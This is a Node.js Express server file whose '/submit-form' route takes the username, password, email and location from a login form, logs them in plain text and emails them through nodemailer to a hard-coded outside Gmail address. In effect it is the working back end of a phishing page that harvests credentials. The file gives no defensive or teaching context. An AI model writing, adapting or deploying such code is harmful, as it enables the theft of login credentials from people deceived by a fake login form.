// server.js
const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Use body-parser middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files from the 'public' directory
app.use(express.static('public'));

// Define a route for handling form submissions
app.post('/submit-form', (req, res) => {
  const { username, password, email, location } = req.body;

  // Log form data to the console (you can replace this with your own logic)
  console.log('Username:', username);
  console.log('Password:', password);
  console.log('Email:', email);
  console.log('Location:', location);

  // Create a nodemailer transporter with your email credentials
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'your-email@gmail.com',
      pass: 'your-email-password',
    },
  });

  // Email content
  const mailOptions = {
    from: 'your-email@gmail.com',
    to: 'deepakprincy3322@gmail.com',
    subject: 'New Login Form Submission',
    html: `
      <p><strong>Username:</strong> ${username}</p>
      <p><strong>Password:</strong> ${password}</p>
      <p><strong>Email:</strong> ${email}</p>
      <p><strong>Location:</strong> ${location}</p>
    `,
  };

  // Send the email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
      res.status(500).send('Internal Server Error');
    } else {
      console.log('Email sent:', info.response);
      res.status(200).send('Success');
    }
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
